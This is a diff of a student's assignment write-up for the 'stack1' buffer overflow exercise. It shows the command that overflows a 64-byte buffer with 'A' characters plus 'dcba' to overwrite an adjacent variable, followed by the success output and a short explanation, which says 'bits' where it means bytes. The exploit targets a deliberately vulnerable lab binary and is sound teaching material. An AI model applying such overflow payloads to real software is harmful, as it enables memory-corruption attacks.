@@ -7,15 +7,10 @@ Assignment 4
 
 stack1 (screenshot attached)
 
-	Output:		0123456789
-				0123456789
-				0123456789
-				0123456789
-				0123456789
-				0123456789
-				0123
-				dcba
+	Input: ./stack1 `python -c 'print "A"*64 + "dcba"'`
 
+	Output: you have correctly got the variable to the right value
+	
 	Explanation:
 		The buffer is of size 64. We overflow the buffer by adding 64 random bits and then we reach the location of the 'modified' variable. We then change that to the corresponding ASCII value to the hex number 0x61626364.
 		64 - d
